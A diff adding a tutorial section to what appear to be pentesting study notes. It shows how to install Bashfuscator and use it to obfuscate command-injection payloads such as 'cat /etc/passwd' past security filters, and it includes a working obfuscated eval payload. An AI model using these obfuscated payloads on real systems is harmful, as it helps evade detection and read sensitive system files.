@@ -105,6 +105,71 @@ As we can see, the above command executes the command perfectly. We did not incl
 > In addition to the techniques we discussed, we can utilize numerous other methods, like wildcards, regex, output redirection, integer expansion, and many others. We can find some such techniques on PayloadsAllTheThings.
 
 
+-----------------------------------
+---------------------------------------
+
+
+# Automated obfuscation tools.
+If we are dealing with advanced security tools, __we may not be able to use basic, manual obfuscation techniques__. In such cases, _it may be best to resort to automated obfuscation tools_. 
+This section will discuss a couple of examples of these types of tools, one for Linux and another for Windows.
+
+## Linux (Bashfuscator)
+A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, 
+as follows:
+```bash
+git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+pip3 install setuptools==65
+python3 setup.py install --user
+```
+
+Once we have the tool set up, we can start using it from the ./bashfuscator/bin/ directory. There are many flags we can use with the tool to fine-tune our final obfuscated command, 
+as we can see in the -h help menu:
+
+
+
+We can start by simply providing the command we want to obfuscate with the `-c` flag:
+```bash
+alejandroPentester@tbhd[/tools]$ ./bashfuscator -c 'cat /etc/passwd'
+[+] Mutators used: Token/ForCode -> Command/Reverse
+[+] Payload:
+ ${*/+27\[X\(} ...SNIP...  ${*~}   
+[+] Payload size: 1664 characters
+```
+> However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to over a million characters!
+So, we can use some of the flags from the help menu to produce a shorter and simpler obfuscated command, as follows:
+
+```bash
+./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+```
+
+
+![10](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/b945db9c-ad8b-44dd-9572-5615c98d106a)
+
+
+<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/a6d00d23-87c1-4f66-928d-f9cdcb1afc58" width="600">
+
+
+
+We can now test the outputted command with bash -c '', to see whether it does execute the intended command:
+```bash
+bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
+```
+
+
+
+![11](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/3714fb3a-cd52-4f19-87b1-fb290fe40b93)
+
+![13](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/44be3001-89fe-4a43-b9bf-34cc4c034b0d)
+
+
+
+
+We can see that the obfuscated command works, all while looking completely obfuscated, and does not resemble our original command. We may also notice that the tool utilizes many obfuscation techniques,
+including the ones we previously discussed and many others.
+
+
+
 
 
 
